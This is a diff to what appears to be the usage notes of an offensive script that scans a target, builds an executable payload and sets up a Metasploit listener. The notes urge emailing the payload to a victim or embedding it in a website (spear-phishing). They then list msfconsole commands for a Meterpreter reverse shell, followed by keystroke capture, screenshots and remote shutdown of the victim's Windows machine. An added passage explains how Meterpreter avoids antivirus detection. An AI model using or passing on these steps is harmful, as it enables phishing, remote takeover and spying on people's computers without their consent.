@@ -285,7 +285,7 @@ print("[*] Exported payload successfully.")
 ====================================================================================================================================================================
 ====================================================================================================================================================================
 ====================================================================================================================================================================
-##copy the code into a file ie. nano dad.py, and dont forget to chmod to make it executable chmod +x dad.py now that dad.py is executable , sudo ./dad.py to run it and it will prompt you to the questions
+##copy the code into a file ie. nano dad.py, and dont forget to chmod to make it executable chmod +x dad.py. Now that dad.py is executable , sudo ./dad.py to run it and it will prompt you to the questions
 ## then it will Nmap scan our target, (I would say this technique is better for spear-phishing since you need to know target ip address to be able to create the payload successful.) and then give you an executable payload
 ## you can put that into a file , attach to a link then email it to your target and hoping they click on it , or if you wanna embed into a website, you can do so.
 
@@ -357,7 +357,7 @@ print("[*] Exported payload successfully.")
 
 >>> EXAMPLE ON How to set up a listener to capture the connection from the target............ in this example our target is Windows OS.
 In KALI , Open a terminal to start a listener and wait for reverse shell connection
-start msfconsole
+in terminal type in msfconsole as a command, then  
 msf6> use multi/handler
 msf6 exploit(multi/handler)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/handler)> show option ## to see what we need to fill out
@@ -365,14 +365,18 @@ msf6 exploit(multi/handler)> set LHOST xx.xx.xx.xx
 msf6 exploit(multi/handler)> set LPORT xxxxx
 msf6 exploit(multi/handler)> run
 ## now we should have Windows machine connected back to us ##
- ##the prompt will change to meterpreter##
-meterpreter> shell ### it will look like we are in Windows , we can capture key stroke, take screenshot or even turn off the Windows OS by using the command "shutdown" , type in help to see more options
+ ##the prompt will change to meterpreter## 
+meterpreter> shell ### it will look like we are in Windows , we can capture key stroke, take screenshot or even turn off the Windows OS by using the command "shutdown" , type in help to see more options.
 meterpreter> help ## to see more options
 meterpreter> keyscan_start
 meterpreter> keyscan_stop
 meterpreter> screenshot ### and much more 
 
  
-
+##NOTE: Meterpreter is a Metaspliiot attack payload that provides an interactive shell to the attacker so they can explore the target machine and execute code.
+        Meterpreter completely resides in the memory of the compromised system and write nothing to the disk (to try to avoid detection by a av). 
+        It doesn't spawn any new process(to also try to avoid av detection) but instead inject(DLL injection) itself into the compromised process.
+        It has an ability to migrate to other running processes easily.
+        By default, Meterpreter communicates over encrypted channel, which leaves a limited trace on the compromised system from a forensic perspective.
 
 
